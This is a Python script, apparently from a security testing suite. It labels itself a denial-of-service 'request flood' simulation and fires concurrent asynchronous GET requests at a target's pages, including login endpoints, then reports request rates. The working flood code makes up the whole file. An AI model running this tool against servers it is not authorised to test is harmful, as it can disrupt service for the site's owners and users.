#!/usr/bin/env python3
"""
Request Flood Attack or Denial of Service (DoS) Simulation
Sends rapid requests to overwhelm the server
"""

import requests
import time
import random
import asyncio
import aiohttp
from datetime import datetime
from colorama import Fore, Style

class RequestFlood:
    def __init__(self, target_url):
        self.target_url = target_url
        self.endpoints = [
            "/",
            "/about", 
            "/services",
            "/contact",
            "/auth/employee-login",
            "/auth/admin-login",
            "/files/"
        ]
        self.results = []
        self.success = 0
        self.failed = 0
        
    async def flood_worker(self, session, endpoint, delay=0):
        """Async worker for flooding"""
        try:
            if delay:
                await asyncio.sleep(delay)
                
            url = f"{self.target_url}{endpoint}"
            
            async with session.get(url) as response:
                status = "SUCCESS" if response.status == 200 else f"FAILED ({response.status})"
                color = Fore.GREEN if response.status == 200 else Fore.RED
                
                if response.status == 200:
                    self.success += 1
                else:
                    self.failed += 1
                    
                print(f"{color}[+] {endpoint} - {status}")
                
                self.results.append({
                    'endpoint': endpoint,
                    'status_code': response.status,
                    'status': status,
                    'timestamp': datetime.now().isoformat()
                })
                
        except Exception as e:
            self.failed += 1
            print(Fore.RED + f"[-] {endpoint} - ERROR: {str(e)[:50]}")
            self.results.append({
                'endpoint': endpoint,
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            })
    
    async def flood_attack(self, requests=100, delay=0.05):
        """Execute async flood attack"""
        connector = aiohttp.TCPConnector(limit=100)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            
            for i in range(requests):
                endpoint = random.choice(self.endpoints)
                task = self.flood_worker(session, endpoint, delay)
                tasks.append(task)
            
            await asyncio.gather(*tasks)
    
    def execute(self, requests=100, delay=0.05):
        """Execute request flood"""
        print(Fore.YELLOW + f"\n[+] Starting Request Flood Attack")
        print(Fore.YELLOW + f"    Target: {self.target_url}")
        print(Fore.YELLOW + f"    Requests: {requests}")
        print(Fore.YELLOW + f"    Delay: {delay}s\n")
        
        start_time = time.time()
        
        # Run async attack
        asyncio.run(self.flood_attack(requests, delay))
        
        elapsed = time.time() - start_time
        
        print(Fore.CYAN + f"\n[+] Attack completed in {elapsed:.2f} seconds")
        print(Fore.CYAN + f"[+] Successful: {self.success}")
        print(Fore.CYAN + f"[+] Failed: {self.failed}")
        print(Fore.CYAN + f"[+] Total: {self.success + self.failed}")
        print(Fore.CYAN + f"[+] Requests/second: {(self.success + self.failed) / elapsed:.2f}")
        
        return {
            'successful': self.success,
            'failed': self.failed,
            'total': self.success + self.failed,
            'elapsed': elapsed,
            'rps': (self.success + self.failed) / elapsed,
            'results': self.results
        }
    